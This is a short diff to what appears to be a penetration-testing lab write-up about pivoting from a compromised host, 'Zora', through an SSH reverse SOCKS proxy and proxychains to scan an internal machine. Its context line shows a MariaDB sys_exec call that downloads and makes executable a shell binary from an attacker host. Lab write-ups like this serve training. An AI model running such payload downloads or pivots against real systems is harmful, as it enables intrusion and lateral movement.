@@ -39,7 +39,6 @@ MariaDB [(none)]> select sys_exec('wget http://KALI_IP/xshell.elf && chmod +x xs
 from="10.11.1.250",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa AAAAB3Nza....Uzqt4+ns= mysql@zora
 ```
 
-   
 2. We set up a dynamic port forward (SOCKS) from Zora to Kali using port **1080**
    
 ```
@@ -47,10 +46,7 @@ ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no
 ```
 
 ```
-kali@kali$ sudo nano /etc/proxychains4.conf
-...
-...
-socks4 127.0.0.1 1080
+sudo echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf
 ```
 
 3. From our Kali, we scanned `10.5.5.20` for open ports using the command `proxychains nmap --top-ports=20 -sT -Pn 10.5.5.20` 
